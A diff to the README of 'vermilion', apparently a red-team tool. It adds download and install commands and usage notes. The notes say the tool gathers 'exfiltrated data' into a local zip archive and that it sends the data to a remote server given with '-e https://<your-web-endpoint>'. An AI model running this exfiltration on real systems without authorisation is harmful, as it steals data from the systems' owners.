@@ -3,6 +3,41 @@
 
 ## Installation  
 
+New version of the tool are released via Github.  
+You can retrieve the release you want from this page.  
+Example via bash (wget):  
+```sh
+wget https://github.com/R3DRUN3/vermilion/releases/download/v0.1.0/vermilion_0.1.0_linux_amd64.tar.gz
+tar -xzf vermilion_0.1.0_linux_amd64.tar.gz
+chmod +x vermilion
+```  
+
+## Usage
+In order to see the tool helper run:  
+```sh
+./vermilion -h
+```  
+
+By default no exfiltration is executed, the following two commands are the same:
+```sh
+./vermilion
+```
+and
+```sh
+vermilion --noexf
+```  
+
+both the previous command produce a local `exdata` folder with a compressed (.zip) archive inside.  
+The archive contains all exfiltrated data.  
+
+
+If you want to specify and endpoint for exfiltration run:  
+```sh
+vermilion -e https://<your-web-endpoint>
+```  
+
+
+
 
 
 ## Debug  
